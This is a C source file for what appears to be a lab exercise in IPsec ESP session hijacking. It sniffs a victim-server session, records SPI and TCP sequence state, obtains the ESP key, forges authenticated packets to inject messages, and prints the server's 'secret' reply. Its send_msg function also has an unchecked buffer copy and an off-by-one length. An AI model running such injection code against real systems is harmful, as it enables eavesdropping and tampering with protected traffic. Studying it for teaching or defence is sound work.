#include <stdio.h>
#include <stdbool.h>
#include <string.h>
#include <unistd.h>
#include <time.h>

#include "replay.h"
#include "dev.h"
#include "net.h"
#include "esp.h"
#include "hmac.h"
#include "transport.h"

struct frame_arr frame_buf;

void tx_esp_rep(Dev dev,
                Net net,
                Esp esp,
                Txp txp,
                uint8_t *data, ssize_t dlen, long msec)
{
    size_t nb = dlen;

    txp.plen = dlen;
    txp.fmt_rep(&txp, net.ip4hdr, data, nb);
    nb += sizeof(struct tcphdr);

    esp.plen = nb;
    esp.fmt_rep(&esp, TCP);
    esp.set_padpl(&esp);
    memcpy(esp.pl, &txp.thdr, txp.hdrlen);
    memcpy(esp.pl + txp.hdrlen, txp.pl, txp.plen);
    esp.set_auth(&esp, hmac_sha1_96);
    nb += sizeof(EspHeader) + sizeof(EspTrailer) +
        esp.tlr.pad_len + esp.authlen;

    net.plen = nb;
    net.fmt_rep(&net);

    dev.fmt_frame(&dev, net, esp, txp);

    dev.tx_frame(&dev);
}

ssize_t send_msg(Dev *dev,
                   Net *net,
                   Esp *esp,
                   Txp *txp,
                   char* str)
{
    if (!dev || !net || !esp || !txp) {
        fprintf(stderr, "Invalid arguments of %s.\n", __func__);
        return -1;
    }

    ssize_t nb;
    uint8_t buf[BUFSIZE];

    if(str != NULL){
        int i;
        for(i = 0; i < strlen(str); i++){
	        buf[i] = (uint8_t)str[i];
        }
        buf[i] = (uint8_t)'\r';
        buf[i+1] = (uint8_t)'\n';
        nb = strlen(str) + 1;
    } else {
	    nb = 0;
    }

    tx_esp_rep(*dev, *net, *esp, *txp, buf, nb, 0);

    return nb;
}

bool dissect_rx_data(Dev *dev,
                Net *net,
                Esp *esp,
                Txp *txp,
                int *state,
                char* victim_ip,
                char* server_ip,
                bool* test_for_dissect)
{
//    printf("[%s]:%d Move on\n",__FILE__,__LINE__);
    uint8_t *net_data = net->dissect(net, dev->frame + LINKHDRLEN, dev->framelen - LINKHDRLEN);

    if (net->pro == ESP) {
        uint8_t *esp_data = esp->dissect(esp, net_data, net->plen);

        uint8_t *txp_data = txp->dissect(net, txp, esp_data, esp->plen);

        if(txp->thdr.psh){

            if(*test_for_dissect){
                *test_for_dissect = false;
                puts("you can start to send the message...");
            }

            if(txp_data != NULL && txp->thdr.psh && *state == WAIT_SECRET &&
                    strcmp(victim_ip,net->dst_ip) == 0 && strcmp(server_ip,net->src_ip) == 0) {
                puts("get secret: ");
	            write(1, txp_data, txp->plen);
                puts("");
               	*state = SEND_ACK;
            }
//	    printf("[%s]:%d Move on (true)\n",__FILE__,__LINE__);
            return true;
        }
//	printf("[%s]:%d Move on (false)\n",__FILE__,__LINE__);
    }
    return false;
}

uint8_t *wait(Dev *dev,
                  Net *net,
                  Esp *esp,
                  Txp *txp,
                  int *state,
                  char* victim_ip,
                  char* server_ip,
                  bool* test_for_dissect)
{
    bool dissect_finish;

    while (true) {
//    	printf("[%s]:%d Move on\n",__FILE__,__LINE__);
        dev->framelen = dev->rx_frame(dev);
        dissect_finish = dissect_rx_data(dev, net, esp, txp, state, victim_ip, server_ip, test_for_dissect) ? true : false;
        if(dissect_finish) break;
    }

    return dev->frame;
}

void record_txp(Net *net, Esp *esp, Txp *txp)
{
    extern EspHeader esp_hdr_rec;

    if (net->pro == ESP && memcmp(net->x_src_ip, net->src_ip, 4) == 0) {
        esp_hdr_rec.spi = esp->hdr.spi;
//        esp_hdr_rec.seq = ntohl(esp->hdr.seq);
        esp_hdr_rec.seq = ntohl(esp->hdr.seq);
    }

    if (memcmp(net->x_src_ip, net->src_ip, 4) == 0) {
//	printf("client -> server\n");
        txp->x_tx_seq = ntohl(txp->thdr.th_seq) + txp->plen;
        txp->x_tx_ack = ntohl(txp->thdr.th_ack);
        txp->x_src_port = ntohs(txp->thdr.th_sport);
        txp->x_dst_port = ntohs(txp->thdr.th_dport);
    }

    if (memcmp(net->x_src_ip, net->dst_ip, 4) == 0) {
//	printf("server -> clinet\n");
        txp->x_tx_seq = ntohl(txp->thdr.th_ack);
        txp->x_tx_ack = ntohl(txp->thdr.th_seq) + txp->plen;
        txp->x_src_port = ntohs(txp->thdr.th_dport);
        txp->x_dst_port = ntohs(txp->thdr.th_sport);
    }
}

void get_info(Dev *dev, Net *net, Esp *esp, Txp *txp,int *state,char* victim_ip,char* server_ip,bool* test_for_dissect)
{
    extern EspHeader esp_hdr_rec;

//    printf("[%s]:%d get_info, before wait\n",__FILE__,__LINE__);
    wait(dev, net, esp, txp, state, victim_ip, server_ip, test_for_dissect);
//    printf("[%s]:%d get_info, after wait\n",__FILE__,__LINE__);

    if(*state != SEND_ACK){

        memcpy(dev->linkhdr, dev->frame, LINKHDRLEN);

/*
        strcpy(net->x_src_ip, net->src_ip);
        strcpy(net->x_dst_ip, net->dst_ip);
*/
        memcpy(net->x_src_ip, net->src_ip, 4);
        memcpy(net->x_dst_ip, net->dst_ip, 4);

/*
	printf("src_ip=%08x dst_ip=%08x\n",*(uint32_t*)net->src_ip,*(uint32_t*)net->dst_ip);
	printf("x_src_ip=%08x x_dst_ip=%08x\n",*(uint32_t*)net->x_src_ip,*(uint32_t*)net->x_dst_ip);
*/


        txp->x_src_port = ntohs(txp->thdr.th_sport);
        txp->x_dst_port = ntohs(txp->thdr.th_dport);

/*
	printf("x_src_port=%04x x_dst_port=%04x\n",(uint32_t*)txp->x_src_port,(uint32_t*)txp->x_dst_port);
	printf("x_tx_seq=%08x x_tx_ack=%08x\n",(uint32_t*)txp->x_tx_seq,(uint32_t*)txp->x_tx_ack);
*/

        record_txp(net, esp, txp);

/*
	printf("x_src_port=%04x x_dst_port=%04x\n",(uint32_t*)txp->x_src_port,(uint32_t*)txp->x_dst_port);
	printf("x_tx_seq=%08x x_tx_ack=%08x\n",(uint32_t*)txp->x_tx_seq,(uint32_t*)txp->x_tx_ack);
*/
        esp_hdr_rec.spi = esp->hdr.spi;
        esp_hdr_rec.seq = esp->hdr.seq;
        esp->get_key(esp);
/*
	printf("[%s]:%d(%s)\t",__FILE__,__LINE__,__func__);
	for(int i=0;i<16;++i){
            printf("%02x",esp->esp_key[i]);
	}
	printf("\n");
*/
    }else{
	record_txp(net,esp,txp);
        esp->hdr.spi = esp_hdr_rec.spi;
        esp->hdr.seq = esp_hdr_rec.seq + 1;
        esp->get_key(esp);
    }
}
